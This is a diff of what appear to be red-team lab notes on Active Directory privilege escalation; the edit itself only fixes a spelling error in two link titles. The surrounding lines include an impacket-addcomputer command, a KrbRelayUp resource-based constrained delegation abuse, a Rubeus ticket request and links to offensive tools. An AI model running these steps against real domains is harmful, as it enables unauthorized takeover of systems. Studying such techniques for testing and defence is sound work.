@@ -27,7 +27,7 @@ Because of where we are in are long term attack path, Jon can add a computer wit
 impacket-addcomputer $domain.$tld/$username -computer-name '$cpName' -computer-pass 'P@ssword1' -dc-ip $DSTdcIP
 ```  
 
-Use [[Krbrelayup]] to Privilege Escalate *not* Lateral movement; we are on DC coercing the LDAP server to abuse `msDS-AllowedToActOnBehalfofotherIdentity` (fancy way of saying Resource based Constrained Delegation) - the machine can write to its own `msDS-AllowedToActOnBehalfofotherIdentity` and update this to want we want. Use `checkPort.exe` to get the correct port: [gist Tothi - No-Fix Local Privilege Escalation from low-priviliged domain user to local system on domain-joined computers.](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9)
+Use [[Krbrelayup]] to Privilege Escalate *not* Lateral movement; we are on DC coercing the LDAP server to abuse `msDS-AllowedToActOnBehalfofotherIdentity` (fancy way of saying Resource based Constrained Delegation) - the machine can write to its own `msDS-AllowedToActOnBehalfofotherIdentity` and update this to want we want. Use `checkPort.exe` to get the correct port: [gist Tothi - No-Fix Local Privilege Escalation from low-privileged domain user to local system on domain-joined computers.](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9)
 ```go
 // Use relay to resource constrained delegation - valuable to know this
 // Other is shadowprint
@@ -43,4 +43,4 @@ rubeus -i -M -- hash / password:P@ssword1 /user:$computerName /domain:$DSTdomain
 
 [YouTube Bishop Fox - Pwning the Domain With Sliver Framework](https://www.youtube.com/watch?v=PPNvN3P3ioY) 
 [GitHub - KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) 
-[gist Tothi - No-Fix Local Privilege Escalation from low-priviliged domain user to local system on domain-joined computers.](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9)
+[gist Tothi - No-Fix Local Privilege Escalation from low-privileged domain user to local system on domain-joined computers.](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9)
